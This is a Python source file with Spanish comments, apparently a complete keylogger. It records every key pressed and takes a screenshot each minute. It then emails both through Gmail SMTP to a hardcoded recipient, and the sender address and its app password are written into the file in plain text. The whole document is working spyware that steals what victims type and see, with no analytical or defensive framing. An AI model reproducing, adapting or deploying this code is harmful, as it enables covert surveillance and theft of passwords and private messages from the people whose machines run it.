import logging
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage
from PIL import ImageGrab
import threading
import keyboard

# Configuración del registro de las pulsaciones de teclas
carpeta_destino = 'C:\\Users\\USUARIO\\Desktop\\Keylogger2\\Keylogger2.txt'

# Dirección de correo electrónico y contraseña para enviar el correo
correo_emisor = 'arielmendieta2109@gmail.com'
contraseña_emisor = 'jkkz vgex fzlc ktke'

# Dirección de correo electrónico del destinatario
correo_destinatario = 'cukicarle@gmail.com'

# Variable para almacenar las teclas presionadas
texto_capturado = ""

def on_keyboard_event(event):
    global texto_capturado
    if event.name == "space":
        texto_capturado += "\n"  # Si se presiona la tecla "space", se agrega un salto de línea
    elif event.name == "enter":
        texto_capturado += "\n"
    else:
        texto_capturado += event.name


def enviar_correo(asunto, mensaje, texto_adjunto, imagen_adjunta):
    # Configurar conexión SMTP
    servidor_smtp = smtplib.SMTP('smtp.gmail.com', 587)
    servidor_smtp.starttls()
    servidor_smtp.login(correo_emisor, contraseña_emisor)

    # Crear el mensaje
    msg = MIMEMultipart()
    msg['From'] = correo_emisor
    msg['To'] = correo_destinatario
    msg['Subject'] = asunto

    # Adjuntar el mensaje de texto
    msg.attach(MIMEText(mensaje + "\n\n" + texto_adjunto, 'plain'))

    # Adjuntar la imagen
    with open(imagen_adjunta, 'rb') as f:
        img = MIMEImage(f.read())
        img.add_header('Content-Disposition', 'attachment', filename=imagen_adjunta)
        msg.attach(img)

    # Enviar el correo electrónico
    servidor_smtp.send_message(msg)

    # Cerrar la conexión SMTP
    servidor_smtp.quit()

def enviar_correo_periodicamente():
    global texto_capturado
    # Capturar una imagen de la pantalla
    imagen_capturada = 'screenshot.png'
    ImageGrab.grab().save(imagen_capturada)

    # Enviar el correo electrónico con el registro de las pulsaciones y la imagen
    asunto = 'Registro de pulsaciones de teclas y captura de pantalla'
    mensaje = 'captura de pantalla.'
    enviar_correo(asunto, mensaje, texto_capturado, imagen_capturada)

    # Limpiar el texto capturado
    texto_capturado = ""

    # Programar el siguiente envío de correo
    threading.Timer(60, enviar_correo_periodicamente).start()

# Configurar el hook para eventos de teclado
keyboard.on_press(on_keyboard_event)

# Iniciar el temporizador para enviar el correo periódicamente
enviar_correo_periodicamente()

# Mantener el programa en ejecución
keyboard.wait()
